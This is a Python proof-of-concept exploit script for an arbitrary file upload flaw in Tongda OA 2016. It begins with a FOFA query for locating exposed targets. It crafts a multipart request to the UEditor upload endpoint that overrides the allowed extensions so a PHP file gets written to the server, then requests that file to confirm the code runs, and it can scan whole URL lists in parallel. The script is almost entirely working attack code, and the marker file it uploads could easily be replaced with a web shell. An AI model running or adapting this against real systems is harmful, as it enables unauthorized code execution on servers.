#FOFA: title=“通达OA 网络智能办公系统”

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': '通达OA 2016 任意文件上传',
        'vulnerable': False,
        'url': target
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    filename = "test"
    shell = f'<?php echo "{randstr1}"."{randstr2}";?>'
    payload = '/module/ueditor/php/action_upload.php?action=uploadfile'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=00content0boundary00',
    }
    vurl = urllib.parse.urljoin(target, payload)
    data = '--00content0boundary00\r\nContent-Disposition: form-data; name="CONFIG[fileFieldName]"\r\n\r\nff\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="CONFIG[fileMaxSize]"\r\n\r\n1000000000\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="CONFIG[filePathFormat]"\r\n\r\n{0}\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\r\n\r\n.php\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="ff"; filename="t.php"\r\nContent-Type: text/plain\r\n\r\n{1}\r\n\r\n--00content0boundary00\r\nContent-Disposition: form-data; name="mufile"\r\n\r\nSubmit\r\n--00content0boundary00--'.format(filename, shell)
    verify_url = urllib.parse.urljoin(target, filename + '.php')
    try:
        rep = requests.get(vurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'},timeout=timeout, verify=False)
        if rep.status_code == 200:
            rep2 = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'},verify=False)
            if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, verify_rep.text):
                result['vulnerable'] = True
                result['verify'] = verify_url
                print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("通达OA 2016 任意文件上传漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()